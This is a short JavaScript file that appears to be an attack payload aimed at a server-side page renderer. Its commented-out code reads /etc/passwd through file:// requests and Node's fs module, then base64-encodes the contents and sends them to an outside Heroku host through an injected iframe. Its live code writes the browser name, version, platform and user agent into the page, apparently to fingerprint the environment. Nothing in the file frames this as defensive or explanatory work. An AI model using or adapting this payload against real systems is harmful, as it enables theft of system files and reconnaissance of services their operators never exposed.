// function reqListener (a) {
//     var encoded = encodeURI(this.responseText);
//     var b64 = btoa(a);//this.responseText);
//     var raw = this.responseText;
//     document.write('<iframe src="http://srvcb.herokuapp.com/?data='+b64+'"></iframe>');
// } 
// var oReq = new XMLHttpRequest(); 
// oReq.addEventListener("load", reqListener); 
// oReq.open("GET", "file:///etc/passwd"); 
// oReq.send();

// var path = "file:///etc/passwd"
// var fs = require('fs')
// fs.readFile(path , 'utf8', function(err, data) {
//   if (err) throw err;
//     reqListener(data)
// //   console.log('OK: ' + filename);
// //   console.log(data)
// });
txt = "<p>Browser CodeName: " + navigator.appCodeName + "</p>";
txt+= "<p>Browser Name: " + navigator.appName + "</p>";
txt+= "<p>Browser Version: " + navigator.appVersion + "</p>";
txt+= "<p>Cookies Enabled: " + navigator.cookieEnabled + "</p>";
txt+= "<p>Platform: " + navigator.platform + "</p>";
txt+= "<p>User-agent header: " + navigator.userAgent + "</p>";
document.write(txt)
